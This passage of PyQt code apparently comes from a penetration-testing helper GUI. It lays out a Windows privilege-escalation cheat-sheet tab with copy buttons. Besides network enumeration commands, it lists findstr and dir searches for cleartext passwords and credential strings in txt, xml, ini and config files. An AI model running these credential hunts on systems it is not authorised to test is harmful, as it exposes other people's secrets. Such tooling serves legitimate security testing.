            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(136,self.wpe_12_Scan1)
     
        # wpe_12_Scan1_Copy
        if hasattr(self, 'wpe_12_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_12_Scan1_Copy)
            self.wpe_12_Scan1_Copy.deleteLater()
        self.wpe_12_Scan1_Copy = QPushButton()
        self.wpe_12_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_12_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_12_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_12_Scan1.text()))
        self.wpe_12_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_12_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_12_Scan1_Copy)
        label_layout.addWidget(self.wpe_12_Scan1)
        self.tab4_container_layout.insertLayout(137, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_12_divider1
        if hasattr(self, 'wpe_12_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_12_divider1)
            self.wpe_12_divider1.deleteLater()
        self.wpe_12_divider1 = QFrame()
        self.wpe_12_divider1.setFrameShape(QFrame.HLine)
        self.wpe_12_divider1.setLineWidth(3)
        self.wpe_12_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_12_divider2
        if hasattr(self, 'wpe_12_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_12_divider2)
            self.wpe_12_divider2.deleteLater()
        self.wpe_12_divider2 = QFrame()
        self.wpe_12_divider2.setFrameShape(QFrame.HLine)
        self.wpe_12_divider2.setLineWidth(3)
        self.wpe_12_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_12_spacer1
        if hasattr(self, 'wpe_12_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_12_spacer1)
            self.wpe_12_spacer1.deleteLater()
        self.wpe_12_spacer1 = QLabel()
        self.wpe_12_spacer1.setFixedWidth(40)
        self.wpe_12_spacer1.setFixedHeight(50)
     
        # wpe_12_spacer2
        if hasattr(self, 'wpe_12_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_12_spacer2)
            self.wpe_12_spacer2.deleteLater()
        self.wpe_12_spacer2 = QLabel()
        self.wpe_12_spacer2.setFixedWidth(40)
        self.wpe_12_spacer2.setFixedHeight(50)
     
        # wpe_12 spacer & divider layout
        self.tab4_container_layout.insertWidget(138, self.wpe_12_spacer1)
        self.tab4_container_layout.insertWidget(139, self.wpe_12_divider1)
        self.tab4_container_layout.insertWidget(140, self.wpe_12_divider2)
        self.tab4_container_layout.insertWidget(141, self.wpe_12_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_12_Scan2
        if hasattr(self, 'wpe_12_Scan2'):
            self.tab4_container_layout.removeWidget(self.wpe_12_Scan2)
            self.wpe_12_Scan2.deleteLater()
        self.wpe_12_Scan2 = QLabel("route print")
        self.wpe_12_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(142,self.wpe_12_Scan2)
     
        # wpe_12_Scan2_Copy
        if hasattr(self, 'wpe_12_Scan2_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_12_Scan2_Copy)
            self.wpe_12_Scan2_Copy.deleteLater()
        self.wpe_12_Scan2_Copy = QPushButton()
        self.wpe_12_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_12_Scan2_Copy.setFixedSize(QSize(20,20))
        self.wpe_12_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_12_Scan2.text()))
        self.wpe_12_Scan2_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_12_Scan2 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_12_Scan2_Copy)
        label_layout.addWidget(self.wpe_12_Scan2)
        self.tab4_container_layout.insertLayout(143, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_12_divider1
        if hasattr(self, 'wpe_12_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_12_divider1)
            self.wpe_12_divider1.deleteLater()
        self.wpe_12_divider1 = QFrame()
        self.wpe_12_divider1.setFrameShape(QFrame.HLine)
        self.wpe_12_divider1.setLineWidth(3)
        self.wpe_12_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_12_divider2
        if hasattr(self, 'wpe_12_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_12_divider2)
            self.wpe_12_divider2.deleteLater()
        self.wpe_12_divider2 = QFrame()
        self.wpe_12_divider2.setFrameShape(QFrame.HLine)
        self.wpe_12_divider2.setLineWidth(3)
        self.wpe_12_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_12_spacer1
        if hasattr(self, 'wpe_12_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_12_spacer1)
            self.wpe_12_spacer1.deleteLater()
        self.wpe_12_spacer1 = QLabel()
        self.wpe_12_spacer1.setFixedWidth(40)
        self.wpe_12_spacer1.setFixedHeight(50)
     
        # wpe_12_spacer2
        if hasattr(self, 'wpe_12_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_12_spacer2)
            self.wpe_12_spacer2.deleteLater()
        self.wpe_12_spacer2 = QLabel()
        self.wpe_12_spacer2.setFixedWidth(40)
        self.wpe_12_spacer2.setFixedHeight(50)
     
        # wpe_12 spacer & divider layout
        self.tab4_container_layout.insertWidget(144, self.wpe_12_spacer1)
        self.tab4_container_layout.insertWidget(145, self.wpe_12_divider1)
        self.tab4_container_layout.insertWidget(146, self.wpe_12_divider2)
        self.tab4_container_layout.insertWidget(147, self.wpe_12_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_12_Scan3
        if hasattr(self, 'wpe_12_Scan3'):
            self.tab4_container_layout.removeWidget(self.wpe_12_Scan3)
            self.wpe_12_Scan3.deleteLater()
        self.wpe_12_Scan3 = QLabel("arp -A")
        self.wpe_12_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(148,self.wpe_12_Scan3)
     
        # wpe_12_Scan3_Copy
        if hasattr(self, 'wpe_12_Scan3_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_12_Scan3_Copy)
            self.wpe_12_Scan3_Copy.deleteLater()
        self.wpe_12_Scan3_Copy = QPushButton()
        self.wpe_12_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_12_Scan3_Copy.setFixedSize(QSize(20,20))
        self.wpe_12_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_12_Scan3.text()))
        self.wpe_12_Scan3_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_12_Scan3 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_12_Scan3_Copy)
        label_layout.addWidget(self.wpe_12_Scan3)
        self.tab4_container_layout.insertLayout(149, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_12_divider1
        if hasattr(self, 'wpe_12_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_12_divider1)
            self.wpe_12_divider1.deleteLater()
        self.wpe_12_divider1 = QFrame()
        self.wpe_12_divider1.setFrameShape(QFrame.HLine)
        self.wpe_12_divider1.setLineWidth(3)
        self.wpe_12_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_12_divider2
        if hasattr(self, 'wpe_12_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_12_divider2)
            self.wpe_12_divider2.deleteLater()
        self.wpe_12_divider2 = QFrame()
        self.wpe_12_divider2.setFrameShape(QFrame.HLine)
        self.wpe_12_divider2.setLineWidth(3)
        self.wpe_12_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_12_spacer1
        if hasattr(self, 'wpe_12_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_12_spacer1)
            self.wpe_12_spacer1.deleteLater()
        self.wpe_12_spacer1 = QLabel()
        self.wpe_12_spacer1.setFixedWidth(40)
        self.wpe_12_spacer1.setFixedHeight(50)
     
        # wpe_12_spacer2
        if hasattr(self, 'wpe_12_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_12_spacer2)
            self.wpe_12_spacer2.deleteLater()
        self.wpe_12_spacer2 = QLabel()
        self.wpe_12_spacer2.setFixedWidth(40)
        self.wpe_12_spacer2.setFixedHeight(50)
     
        # wpe_12 spacer & divider layout
        self.tab4_container_layout.insertWidget(150, self.wpe_12_spacer1)
        self.tab4_container_layout.insertWidget(151, self.wpe_12_divider1)
        self.tab4_container_layout.insertWidget(152, self.wpe_12_divider2)
        self.tab4_container_layout.insertWidget(153, self.wpe_12_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_12_Scan4
        if hasattr(self, 'wpe_12_Scan4'):
            self.tab4_container_layout.removeWidget(self.wpe_12_Scan4)
            self.wpe_12_Scan4.deleteLater()
        self.wpe_12_Scan4 = QLabel("ipconfig /all")
        self.wpe_12_Scan4.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(154,self.wpe_12_Scan4)
     
        # wpe_12_Scan4_Copy
        if hasattr(self, 'wpe_12_Scan4_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_12_Scan4_Copy)
            self.wpe_12_Scan4_Copy.deleteLater()
        self.wpe_12_Scan4_Copy = QPushButton()
        self.wpe_12_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_12_Scan4_Copy.setFixedSize(QSize(20,20))
        self.wpe_12_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_12_Scan4.text()))
        self.wpe_12_Scan4_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_12_Scan4 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_12_Scan4_Copy)
        label_layout.addWidget(self.wpe_12_Scan4)
        self.tab4_container_layout.insertLayout(155, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_12_divider1
        if hasattr(self, 'wpe_12_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_12_divider1)
            self.wpe_12_divider1.deleteLater()
        self.wpe_12_divider1 = QFrame()
        self.wpe_12_divider1.setFrameShape(QFrame.HLine)
        self.wpe_12_divider1.setLineWidth(3)
        self.wpe_12_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_12_divider2
        if hasattr(self, 'wpe_12_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_12_divider2)
            self.wpe_12_divider2.deleteLater()
        self.wpe_12_divider2 = QFrame()
        self.wpe_12_divider2.setFrameShape(QFrame.HLine)
        self.wpe_12_divider2.setLineWidth(3)
        self.wpe_12_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_12_spacer1
        if hasattr(self, 'wpe_12_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_12_spacer1)
            self.wpe_12_spacer1.deleteLater()
        self.wpe_12_spacer1 = QLabel()
        self.wpe_12_spacer1.setFixedWidth(40)
        self.wpe_12_spacer1.setFixedHeight(50)
     
        # wpe_12_spacer2
        if hasattr(self, 'wpe_12_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_12_spacer2)
            self.wpe_12_spacer2.deleteLater()
        self.wpe_12_spacer2 = QLabel()
        self.wpe_12_spacer2.setFixedWidth(40)
        self.wpe_12_spacer2.setFixedHeight(50)
     
        # wpe_12 spacer & divider layout
        self.tab4_container_layout.insertWidget(156, self.wpe_12_spacer1)
        self.tab4_container_layout.insertWidget(157, self.wpe_12_divider1)
        self.tab4_container_layout.insertWidget(158, self.wpe_12_divider2)
        self.tab4_container_layout.insertWidget(159, self.wpe_12_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_13
        if hasattr(self, 'wpe_13'):
            self.tab4_container_layout.removeWidget(self.wpe_13)
            self.wpe_13.deleteLater()
        self.wpe_13 = QLabel("[ + Cleartext Passwords in Files ]")
        self.wpe_13.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(160,self.wpe_13)
     
        # wpe_13_Scan1
        if hasattr(self, 'wpe_13_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_13_Scan1)
            self.wpe_13_Scan1.deleteLater()
        self.wpe_13_Scan1 = QLabel("findstr /si password *.txt")
        self.wpe_13_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(161,self.wpe_13_Scan1)
     
        # wpe_13_Scan1_Copy
        if hasattr(self, 'wpe_13_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_13_Scan1_Copy)
            self.wpe_13_Scan1_Copy.deleteLater()
        self.wpe_13_Scan1_Copy = QPushButton()
        self.wpe_13_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_13_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_13_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_13_Scan1.text()))
        self.wpe_13_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_13_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_13_Scan1_Copy)
        label_layout.addWidget(self.wpe_13_Scan1)
        self.tab4_container_layout.insertLayout(162, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_13_divider1
        if hasattr(self, 'wpe_13_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_13_divider1)
            self.wpe_13_divider1.deleteLater()
        self.wpe_13_divider1 = QFrame()
        self.wpe_13_divider1.setFrameShape(QFrame.HLine)
        self.wpe_13_divider1.setLineWidth(3)
        self.wpe_13_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_13_divider2
        if hasattr(self, 'wpe_13_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_13_divider2)
            self.wpe_13_divider2.deleteLater()
        self.wpe_13_divider2 = QFrame()
        self.wpe_13_divider2.setFrameShape(QFrame.HLine)
        self.wpe_13_divider2.setLineWidth(3)
        self.wpe_13_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_13_spacer1
        if hasattr(self, 'wpe_13_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_13_spacer1)
            self.wpe_13_spacer1.deleteLater()
        self.wpe_13_spacer1 = QLabel()
        self.wpe_13_spacer1.setFixedWidth(40)
        self.wpe_13_spacer1.setFixedHeight(50)
     
        # wpe_13_spacer2
        if hasattr(self, 'wpe_13_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_13_spacer2)
            self.wpe_13_spacer2.deleteLater()
        self.wpe_13_spacer2 = QLabel()
        self.wpe_13_spacer2.setFixedWidth(40)
        self.wpe_13_spacer2.setFixedHeight(50)
     
        # wpe_13 spacer & divider layout
        self.tab4_container_layout.insertWidget(163, self.wpe_13_spacer1)
        self.tab4_container_layout.insertWidget(164, self.wpe_13_divider1)
        self.tab4_container_layout.insertWidget(165, self.wpe_13_divider2)
        self.tab4_container_layout.insertWidget(166, self.wpe_13_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_13_Scan2
        if hasattr(self, 'wpe_13_Scan2'):
            self.tab4_container_layout.removeWidget(self.wpe_13_Scan2)
            self.wpe_13_Scan2.deleteLater()
        self.wpe_13_Scan2 = QLabel("findstr /si password *.xml")
        self.wpe_13_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(167,self.wpe_13_Scan2)
     
        # wpe_13_Scan2_Copy
        if hasattr(self, 'wpe_13_Scan2_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_13_Scan2_Copy)
            self.wpe_13_Scan2_Copy.deleteLater()
        self.wpe_13_Scan2_Copy = QPushButton()
        self.wpe_13_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_13_Scan2_Copy.setFixedSize(QSize(20,20))
        self.wpe_13_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_13_Scan2.text()))
        self.wpe_13_Scan2_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_13_Scan2 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_13_Scan2_Copy)
        label_layout.addWidget(self.wpe_13_Scan2)
        self.tab4_container_layout.insertLayout(168, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_13_divider1
        if hasattr(self, 'wpe_13_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_13_divider1)
            self.wpe_13_divider1.deleteLater()
        self.wpe_13_divider1 = QFrame()
        self.wpe_13_divider1.setFrameShape(QFrame.HLine)
        self.wpe_13_divider1.setLineWidth(3)
        self.wpe_13_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_13_divider2
        if hasattr(self, 'wpe_13_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_13_divider2)
            self.wpe_13_divider2.deleteLater()
        self.wpe_13_divider2 = QFrame()
        self.wpe_13_divider2.setFrameShape(QFrame.HLine)
        self.wpe_13_divider2.setLineWidth(3)
        self.wpe_13_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_13_spacer1
        if hasattr(self, 'wpe_13_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_13_spacer1)
            self.wpe_13_spacer1.deleteLater()
        self.wpe_13_spacer1 = QLabel()
        self.wpe_13_spacer1.setFixedWidth(40)
        self.wpe_13_spacer1.setFixedHeight(50)
     
        # wpe_13_spacer2
        if hasattr(self, 'wpe_13_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_13_spacer2)
            self.wpe_13_spacer2.deleteLater()
        self.wpe_13_spacer2 = QLabel()
        self.wpe_13_spacer2.setFixedWidth(40)
        self.wpe_13_spacer2.setFixedHeight(50)
     
        # wpe_13 spacer & divider layout
        self.tab4_container_layout.insertWidget(169, self.wpe_13_spacer1)
        self.tab4_container_layout.insertWidget(170, self.wpe_13_divider1)
        self.tab4_container_layout.insertWidget(171, self.wpe_13_divider2)
        self.tab4_container_layout.insertWidget(172, self.wpe_13_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_13_Scan3
        if hasattr(self, 'wpe_13_Scan3'):
            self.tab4_container_layout.removeWidget(self.wpe_13_Scan3)
            self.wpe_13_Scan3.deleteLater()
        self.wpe_13_Scan3 = QLabel("findstr /si password *.ini")
        self.wpe_13_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(173,self.wpe_13_Scan3)
     
        # wpe_13_Scan3_Copy
        if hasattr(self, 'wpe_13_Scan3_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_13_Scan3_Copy)
            self.wpe_13_Scan3_Copy.deleteLater()
        self.wpe_13_Scan3_Copy = QPushButton()
        self.wpe_13_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_13_Scan3_Copy.setFixedSize(QSize(20,20))
        self.wpe_13_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_13_Scan3.text()))
        self.wpe_13_Scan3_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_13_Scan3 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_13_Scan3_Copy)
        label_layout.addWidget(self.wpe_13_Scan3)
        self.tab4_container_layout.insertLayout(174, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_13_divider1
        if hasattr(self, 'wpe_13_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_13_divider1)
            self.wpe_13_divider1.deleteLater()
        self.wpe_13_divider1 = QFrame()
        self.wpe_13_divider1.setFrameShape(QFrame.HLine)
        self.wpe_13_divider1.setLineWidth(3)
        self.wpe_13_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_13_divider2
        if hasattr(self, 'wpe_13_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_13_divider2)
            self.wpe_13_divider2.deleteLater()
        self.wpe_13_divider2 = QFrame()
        self.wpe_13_divider2.setFrameShape(QFrame.HLine)
        self.wpe_13_divider2.setLineWidth(3)
        self.wpe_13_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_13_spacer1
        if hasattr(self, 'wpe_13_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_13_spacer1)
            self.wpe_13_spacer1.deleteLater()
        self.wpe_13_spacer1 = QLabel()
        self.wpe_13_spacer1.setFixedWidth(40)
        self.wpe_13_spacer1.setFixedHeight(50)
     
        # wpe_13_spacer2
        if hasattr(self, 'wpe_13_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_13_spacer2)
            self.wpe_13_spacer2.deleteLater()
        self.wpe_13_spacer2 = QLabel()
        self.wpe_13_spacer2.setFixedWidth(40)
        self.wpe_13_spacer2.setFixedHeight(50)
     
        # wpe_13 spacer & divider layout
        self.tab4_container_layout.insertWidget(175, self.wpe_13_spacer1)
        self.tab4_container_layout.insertWidget(176, self.wpe_13_divider1)
        self.tab4_container_layout.insertWidget(177, self.wpe_13_divider2)
        self.tab4_container_layout.insertWidget(178, self.wpe_13_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_14
        if hasattr(self, 'wpe_14'):
            self.tab4_container_layout.removeWidget(self.wpe_14)
            self.wpe_14.deleteLater()
        self.wpe_14 = QLabel("[ + Password and Credential strings in config files ]")
        self.wpe_14.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(179,self.wpe_14)
     
        # wpe_14_Scan1
        if hasattr(self, 'wpe_14_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_14_Scan1)
            self.wpe_14_Scan1.deleteLater()
        self.wpe_14_Scan1 = QLabel("dir /s pass == cred == vnc == .config")
        self.wpe_14_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(180,self.wpe_14_Scan1)
     
        # wpe_14_Scan1_Copy
        if hasattr(self, 'wpe_14_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_14_Scan1_Copy)
            self.wpe_14_Scan1_Copy.deleteLater()
        self.wpe_14_Scan1_Copy = QPushButton()
        self.wpe_14_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_14_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_14_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_14_Scan1.text()))
        self.wpe_14_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_14_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_14_Scan1_Copy)
        label_layout.addWidget(self.wpe_14_Scan1)
        self.tab4_container_layout.insertLayout(181, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_14_divider1
        if hasattr(self, 'wpe_14_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_14_divider1)
            self.wpe_14_divider1.deleteLater()
        self.wpe_14_divider1 = QFrame()
        self.wpe_14_divider1.setFrameShape(QFrame.HLine)
        self.wpe_14_divider1.setLineWidth(3)
        self.wpe_14_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_14_divider2
        if hasattr(self, 'wpe_14_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_14_divider2)
            self.wpe_14_divider2.deleteLater()
        self.wpe_14_divider2 = QFrame()
        self.wpe_14_divider2.setFrameShape(QFrame.HLine)
        self.wpe_14_divider2.setLineWidth(3)
        self.wpe_14_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_14_spacer1
        if hasattr(self, 'wpe_14_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_14_spacer1)
            self.wpe_14_spacer1.deleteLater()
        self.wpe_14_spacer1 = QLabel()
        self.wpe_14_spacer1.setFixedWidth(40)
        self.wpe_14_spacer1.setFixedHeight(50)
     
        # wpe_14_spacer2
        if hasattr(self, 'wpe_14_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_14_spacer2)
            self.wpe_14_spacer2.deleteLater()
        self.wpe_14_spacer2 = QLabel()
        self.wpe_14_spacer2.setFixedWidth(40)
        self.wpe_14_spacer2.setFixedHeight(50)
     
        # wpe_14 spacer & divider layout
        self.tab4_container_layout.insertWidget(182, self.wpe_14_spacer1)
        self.tab4_container_layout.insertWidget(183, self.wpe_14_divider1)
        self.tab4_container_layout.insertWidget(184, self.wpe_14_divider2)
        self.tab4_container_layout.insertWidget(185, self.wpe_14_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_15
        if hasattr(self, 'wpe_15'):
            self.tab4_container_layout.removeWidget(self.wpe_15)
            self.wpe_15.deleteLater()
        self.wpe_15 = QLabel("[ + Find all passwords in all files ]")
        self.wpe_15.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(186,self.wpe_15)
     
        # wpe_15_Scan1
        if hasattr(self, 'wpe_15_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_15_Scan1)
            self.wpe_15_Scan1.deleteLater()
        self.wpe_15_Scan1 = QLabel("findstr /spin \"password\" .")
        self.wpe_15_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(187,self.wpe_15_Scan1)
     
        # wpe_15_Scan1_Copy
        if hasattr(self, 'wpe_15_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_15_Scan1_Copy)
            self.wpe_15_Scan1_Copy.deleteLater()
        self.wpe_15_Scan1_Copy = QPushButton()
        self.wpe_15_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_15_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_15_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_15_Scan1.text()))
        self.wpe_15_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_15_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_15_Scan1_Copy)
        label_layout.addWidget(self.wpe_15_Scan1)
        self.tab4_container_layout.insertLayout(188, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_15_divider1
        if hasattr(self, 'wpe_15_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_15_divider1)
            self.wpe_15_divider1.deleteLater()
        self.wpe_15_divider1 = QFrame()
        self.wpe_15_divider1.setFrameShape(QFrame.HLine)
        self.wpe_15_divider1.setLineWidth(3)
        self.wpe_15_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_15_divider2
        if hasattr(self, 'wpe_15_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_15_divider2)
            self.wpe_15_divider2.deleteLater()
        self.wpe_15_divider2 = QFrame()
        self.wpe_15_divider2.setFrameShape(QFrame.HLine)
        self.wpe_15_divider2.setLineWidth(3)
        self.wpe_15_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_15_spacer1
        if hasattr(self, 'wpe_15_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_15_spacer1)
            self.wpe_15_spacer1.deleteLater()
        self.wpe_15_spacer1 = QLabel()
        self.wpe_15_spacer1.setFixedWidth(40)
        self.wpe_15_spacer1.setFixedHeight(50)
     
        # wpe_15_spacer2
        if hasattr(self, 'wpe_15_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_15_spacer2)
            self.wpe_15_spacer2.deleteLater()
        self.wpe_15_spacer2 = QLabel()
        self.wpe_15_spacer2.setFixedWidth(40)
        self.wpe_15_spacer2.setFixedHeight(50)
     
        # wpe_15 spacer & divider layout
        self.tab4_container_layout.insertWidget(189, self.wpe_15_spacer1)
        self.tab4_container_layout.insertWidget(190, self.wpe_15_divider1)
        self.tab4_container_layout.insertWidget(191, self.wpe_15_divider2)
        self.tab4_container_layout.insertWidget(192, self.wpe_15_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_16
        if hasattr(self, 'wpe_16'):
            self.tab4_container_layout.removeWidget(self.wpe_16)
            self.wpe_16.deleteLater()
        self.wpe_16 = QLabel("[ + WINDOWS SHARES ]")
        self.wpe_16.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(193,self.wpe_16)
     
        # wpe_16_Scan1
        if hasattr(self, 'wpe_16_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_16_Scan1)
            self.wpe_16_Scan1.deleteLater()
        self.wpe_16_Scan1 = QLabel("NET SHARE")
        self.wpe_16_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(194,self.wpe_16_Scan1)
     
        # wpe_16_Scan1_Copy
        if hasattr(self, 'wpe_16_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_16_Scan1_Copy)
            self.wpe_16_Scan1_Copy.deleteLater()
        self.wpe_16_Scan1_Copy = QPushButton()
        self.wpe_16_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
